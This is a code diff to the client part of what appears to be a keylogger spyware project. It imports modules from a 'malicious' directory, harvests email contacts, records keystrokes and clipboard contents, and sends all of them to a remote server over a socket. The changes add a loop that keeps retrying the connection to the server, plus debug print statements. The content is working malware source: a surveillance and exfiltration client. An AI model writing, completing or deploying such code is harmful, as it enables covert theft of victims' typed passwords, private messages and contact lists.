@@ -4,7 +4,6 @@ Client that sends key logs and contacts to server
 """
 
 import os
-import subprocess
 import sys
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'malicious')))
@@ -23,16 +22,23 @@ class Client:
         """
         Constructor method for Client
         """
+        msg_printed = False
+        connected = False
         try:
             try:
                 self.contacts = contacts.Contacts()
-                contact_thread = threading.Thread(
-                    target=self.contacts.get_email_addresses)
-                contact_thread.start()
-            except error as msg:
+                self.contacts.get_email_addresses()
+            except Exception as msg:
                 print(msg)
-            self.client_socket = socket(AF_INET, SOCK_STREAM)
-            self.client_socket.connect((ip, port))
+            while not connected:
+                try:
+                    self.client_socket = socket(AF_INET, SOCK_STREAM)
+                    self.client_socket.connect((ip, port))
+                except Exception as msg:
+                    if not msg_printed:
+                        print("couldn't connect to server")
+                else:
+                    connected = True
             self.login()
             self.keylogger = keylogger.Keylogger()
             self.output()
@@ -58,11 +64,13 @@ class Client:
             logged_data = self.keylogger.__getattribute__("logged_data")
             if len(logged_data) > NO_DATA:
                 for data in logged_data:
+                    print("sent", data )
                     Protocol.send(self.client_socket, "KEYLOGGER:" + data)
                     self.keylogger.remove_logged()
             clipboard_data = self.keylogger.__getattribute__("copied_data")
             if len(clipboard_data) > NO_DATA:
                 for data in clipboard_data:
+                    print("sent", data )
                     Protocol.send(self.client_socket, "CLIPBOARD:" + data)
                     self.keylogger.remove_copied()
             if not sent and self.contacts.finished_extracting:
@@ -76,6 +84,7 @@ class Client:
         text = "\n".join(self.contacts.__getattribute__("email_addresses"))
         split_text = [text[i:i + CHARS] for i in range(FIRST, len(text), CHARS)]
         for text in split_text:
+            print("sent", split_text)
             Protocol.send(self.client_socket, f"contacts:{text}")
 
     def login(self):
